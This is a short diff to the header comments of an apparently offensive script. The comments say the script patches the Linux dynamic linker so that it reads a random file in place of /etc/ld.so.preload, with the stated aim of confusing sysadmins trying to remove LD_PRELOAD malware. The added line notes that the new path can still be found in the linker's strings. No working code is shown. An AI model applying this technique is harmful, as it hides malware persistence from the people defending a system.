@@ -2,6 +2,7 @@
 
 # modifies the dynamic linker and changes the target location of /etc/ld.so.preload to a random file in a random directory
 # this means that ld.so.preload will no longer make a difference, and it'll confuse the fuck out of sysadmins trying to remove any LD_PRELOAD malware on their box
+# 'new' ld.so.preload file location can still be discovered by reading the strings in the dynamic linker libraries
 
 # this python script is based off of http://everydaywithlinux.blogspot.co.uk/2012/11/patch-strings-in-binary-files-with-sed.html
 
